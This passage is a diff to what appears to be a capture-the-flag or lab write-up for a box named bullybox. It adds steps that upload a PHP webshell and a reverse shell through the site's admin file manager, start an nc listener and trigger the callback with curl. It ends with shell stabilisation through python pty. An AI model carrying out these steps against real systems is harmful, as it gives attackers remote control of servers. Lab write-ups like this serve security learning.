@@ -129,5 +129,47 @@ we need to prepare a PHP webshell.
 ls /usr/share/webshells/php/
 
 cp /usr/share/webshells/php/php-backdoor.php ./
-# ?c param
+# ?c=pwd parameter
+
+# edit test.php
+http://bullybox.local/bb-admin/filemanager
+
+http://bullybox.local/test.php
 ```
+
+CTRL-S doesn't work on the filemanager page, we need to use Burp Suite.
+
+
+Now CTRL-S works! let's try it.
+
+```
+http://bullybox.local/test.php?c=ls
+```
+
+a bit janky. let's use a simpler reverse shell file.
+
+```sh
+ls /usr/share/webshells/php/php-reverse-shell.php
+cp /usr/share/webshells/php/php-reverse-shell.php ./
+
+# edit file
+ip a|grep 192 #get ip of attacker
+
+
+$ip = '192.168.49.60';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+
+# start rev shell listener
+nc -nvlp 4444
+
+# visit site after uploading file
+curl -vvvk http://bullybox.local/php-reverse-shell.php
+
+
+# stabilize shell
+which python3
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+we get reverse shell. great.
